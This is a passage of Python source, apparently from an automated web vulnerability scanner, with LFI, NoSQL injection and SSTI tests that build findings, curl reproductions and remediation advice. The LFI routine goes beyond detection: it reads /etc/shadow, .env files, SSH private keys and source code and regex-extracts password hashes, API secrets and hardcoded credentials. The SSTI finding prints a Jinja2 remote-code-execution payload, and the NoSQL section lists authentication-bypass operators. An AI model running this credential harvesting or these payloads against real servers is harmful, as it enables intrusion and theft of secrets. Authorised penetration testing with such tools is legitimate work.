                for indicator in LFI_INDICATORS:
                    if indicator in body:
                        # BREACH IT - Extract ALL sensitive files
                        breached_files = await self._breach_lfi(url, param, method, cookies)
                        file_content = self._extract_file_content(body, payload)

                        # Build evidence with breached files
                        evidence = f"**FILES BREACHED:**\n{file_content}\n"
                        if breached_files:
                            if breached_files.get("passwd"):
                                evidence += f"\n**/etc/passwd (users):**\n{breached_files['passwd'][:500]}\n"
                            if breached_files.get("env_file"):
                                evidence += f"\n**.env (credentials):**\n{breached_files['env_file'][:500]}\n"
                            if breached_files.get("shadow"):
                                evidence += f"\n**/etc/shadow (HASHES!):**\n{breached_files['shadow'][:300]}\n"
                            if breached_files.get("ssh_keys"):
                                evidence += f"\n**SSH Private Keys: {len(breached_files['ssh_keys'])} found**\n"

                        return Finding(
                            severity="CRITICAL",
                            category="lfi",
                            title=f"LFI - SERVER FILES BREACHED - {param}",
                            description=f"Arbitrary file read CONFIRMED. Extracted {len(breached_files)} sensitive files.",
                            endpoint=url,
                            method=method,
                            parameter=param,
                            payload=payload,
                            raw_request=raw_req,
                            raw_response=body[:2000],
                            response_time=elapsed,
                            evidence=evidence,
                            data_exposed=breached_files,
                            business_impact=150000,
                            impact_explanation=f"Full server file access. Extracted passwords, configs, SSH keys.",
                            curl_command=self._build_curl(url, param, payload, method),
                            steps=[
                                f"1. Set {param} to: {payload}",
                                "2. Read /etc/passwd - got user list",
                                "3. Read .env files - got database credentials",
                                "4. Attempted /etc/shadow and SSH keys",
                            ],
                            remediation="Validate file paths. Use whitelist of allowed files. Chroot the application.",
                            cwe_id="CWE-22",
                            owasp="A01:2021 – Broken Access Control",
                        )

            except:
                pass

        return None

    def _extract_file_content(self, body: str, payload: str) -> str:
        """Extract file content evidence."""
        if "passwd" in payload:
            if match := re.search(r'root:.*?:/bin/(?:bash|sh)', body):
                return f"File content: {match.group(0)}"
        if "win.ini" in payload:
            if match := re.search(r'\[(?:extensions|fonts)\][^\[]*', body, re.IGNORECASE):
                return f"File content: {match.group(0)[:200]}"

        return "Sensitive file content detected"

    async def _breach_lfi(
        self,
        url: str,
        param: str,
        method: str,
        cookies: Dict,
    ) -> Dict:
        """Fully breach via LFI - extract all sensitive files."""
        breached = {}

        sensitive_files = [
            # Linux system files
            ("../../../etc/passwd", "passwd"),
            ("../../../etc/shadow", "shadow"),
            ("../../../etc/hosts", "hosts"),
            # Application configs
            ("../../../.env", "env_file"),
            ("../../.env", "env_file"),
            ("../.env", "env_file"),
            (".env", "env_file"),
            ("../../../.env.local", "env_local"),
            ("../../../config/database.yml", "db_config"),
            ("../../../config/secrets.yml", "secrets"),
            # SSH keys
            ("../../../root/.ssh/id_rsa", "ssh_key_root"),
            ("../../../home/ubuntu/.ssh/id_rsa", "ssh_key_ubuntu"),
            ("../../.ssh/id_rsa", "ssh_key"),
            # Application source
            ("../../../app.py", "source_code"),
            ("../../../main.py", "source_code"),
            ("../../../settings.py", "settings"),
            ("../../../config.py", "config"),
            # Windows
            ("..\\..\\..\\windows\\win.ini", "win_ini"),
            ("..\\..\\..\\boot.ini", "boot_ini"),
        ]

        for payload, key in sensitive_files:
            try:
                body, _, status, _ = await self._send_payload(url, param, payload, method, cookies)

                # Check if we got actual file content
                if status == 200 and body and len(body) > 10:
                    # Verify it's not an error page
                    if "404" not in body[:100] and "not found" not in body.lower()[:100]:
                        # Check for actual content indicators
                        if key == "passwd" and "root:" in body:
                            breached["passwd"] = body[:1000]
                            # Try to extract usernames
                            users = re.findall(r'^([^:]+):', body, re.MULTILINE)
                            breached["users"] = users[:20]
                        elif key == "shadow" and ("$" in body or "root:" in body):
                            breached["shadow"] = body[:500]
                            # Extract password hashes
                            hashes = re.findall(r'([^:]+:\$[^:]+):', body)
                            breached["password_hashes"] = hashes[:10]
                        elif key == "env_file" and "=" in body:
                            breached["env_file"] = body[:1000]
                            # Extract secrets
                            secrets = re.findall(r'((?:PASSWORD|SECRET|KEY|TOKEN|API)[A-Z_]*=[^\n]+)', body, re.IGNORECASE)
                            breached["extracted_secrets"] = secrets[:10]
                        elif "ssh_key" in key and "PRIVATE KEY" in body:
                            if "ssh_keys" not in breached:
                                breached["ssh_keys"] = []
                            breached["ssh_keys"].append({
                                "path": payload,
                                "key_preview": body[:100] + "...[REDACTED]"
                            })
                        elif key in ["source_code", "settings", "config"]:
                            breached[key] = body[:500]
                            # Look for hardcoded credentials
                            creds = re.findall(r'(password|secret|api_key|token)\s*[=:]\s*["\']([^"\']+)["\']', body, re.IGNORECASE)
                            if creds:
                                breached["hardcoded_creds"] = creds[:5]
            except:
                pass

        return breached

    # =========================================================================
    # NOSQL INJECTION
    # =========================================================================

    async def _test_nosql(
        self,
        url: str,
        param: str,
        method: str,
        cookies: Dict = None,
    ) -> Optional[Finding]:
        """Test for NoSQL injection."""

        # Get baseline
        baseline_body, _, baseline_status, _ = await self._send_payload(
            url, param, "test123", method, cookies
        )

        for payload in NOSQL_PAYLOADS[:10]:
            try:
                body, elapsed, status, raw_req = await self._send_payload(
                    url, param, payload, method, cookies
                )

                # Auth bypass check
                if baseline_status in [401, 403] and status == 200:
                    return Finding(
                        severity="CRITICAL",
                        category="nosql",
                        title=f"NoSQL Injection (Auth Bypass) - {param}",
                        description=f"NoSQL operator injection bypassed authentication.",
                        endpoint=url,
                        method=method,
                        parameter=param,
                        payload=payload,
                        raw_request=raw_req,
                        raw_response=body[:2000],
                        response_time=elapsed,
                        evidence=f"Status changed from {baseline_status} to {status}",
                        business_impact=80000,
                        impact_explanation="Can bypass login, access any user account, extract data.",
                        curl_command=self._build_curl(url, param, payload, method),
                        steps=[
                            f"1. Set {param} to: {payload}",
                            "2. Observe authentication bypass",
                            '3. Try: {"$ne": null} to match any document',
                            '4. Extract data with: {"$regex": ".*"}',
                        ],
                        remediation="Validate input types. Use MongoDB driver query builders. Don't allow operators in input.",
                        cwe_id="CWE-943",
                        owasp="A03:2021 – Injection",
                    )

                # Data leak check
                if len(body) > len(baseline_body) * 2 and len(body) > 500:
                    return Finding(
                        severity="HIGH",
                        category="nosql",
                        title=f"NoSQL Injection (Data Exposure) - {param}",
                        description=f"NoSQL injection returned significantly more data than normal.",
                        endpoint=url,
                        method=method,
                        parameter=param,
                        payload=payload,
                        raw_request=raw_req,
                        raw_response=body[:2000],
                        response_time=elapsed,
                        evidence=f"Response size: {len(body)} bytes (baseline: {len(baseline_body)} bytes)",
                        business_impact=50000,
                        impact_explanation="Can extract database contents using operator injection.",
                        curl_command=self._build_curl(url, param, payload, method),
                        remediation="Validate input types. Don't allow MongoDB operators in user input.",
                        cwe_id="CWE-943",
                        owasp="A03:2021 – Injection",
                    )

            except:
                pass

        return None

    # =========================================================================
    # SSTI (Server-Side Template Injection)
    # =========================================================================

    async def _test_ssti(
        self,
        url: str,
        param: str,
        method: str,
        cookies: Dict = None,
    ) -> Optional[Finding]:
        """Test for Server-Side Template Injection."""

        # Test with math expression
        test_payloads = [
            ("{{7*7}}", "49"),
            ("${7*7}", "49"),
            ("#{7*7}", "49"),
            ("<%= 7*7 %>", "49"),
            ("{{7*'7'}}", "7777777"),
        ]

        for payload, expected in test_payloads:
            try:
                body, elapsed, status, raw_req = await self._send_payload(
                    url, param, payload, method, cookies
                )

                if expected in body and payload not in body:
                    # Confirmed SSTI - template evaluated our expression
                    return Finding(
                        severity="CRITICAL",
                        category="ssti",
                        title=f"Server-Side Template Injection - {param}",
                        description=f"Template engine evaluated: {payload} = {expected}. Can execute arbitrary code!",
                        endpoint=url,
                        method=method,
                        parameter=param,
                        payload=payload,
                        raw_request=raw_req,
                        raw_response=body[:2000],
                        response_time=elapsed,
                        evidence=f"Math expression '{payload}' evaluated to '{expected}'",
                        business_impact=200000,
                        impact_explanation="Can execute arbitrary code on server. Full system compromise.",
                        curl_command=self._build_curl(url, param, payload, method),
                        steps=[
                            f"1. Inject: {payload}",
                            f"2. Observe result: {expected}",
                            "3. Jinja2 RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                            "4. Read files, execute commands, establish shell",
                        ],
                        remediation="Use logic-less templates. Sandbox template execution. Never render user input in templates.",
                        cwe_id="CWE-94",
                        owasp="A03:2021 – Injection",
                    )

            except:
                pass

        return None

    # =========================================================================
    # HELPERS
    # =========================================================================

    def _build_curl(self, url: str, param: str, payload: str, method: str) -> str:
        """Build a curl command to reproduce the finding."""
        encoded_payload = quote(payload)

        if method.upper() == "GET":
            sep = "&" if "?" in url else "?"
            return f"curl '{url}{sep}{param}={encoded_payload}'"
        else:
            return f"curl -X POST '{url}' -d '{param}={encoded_payload}'"
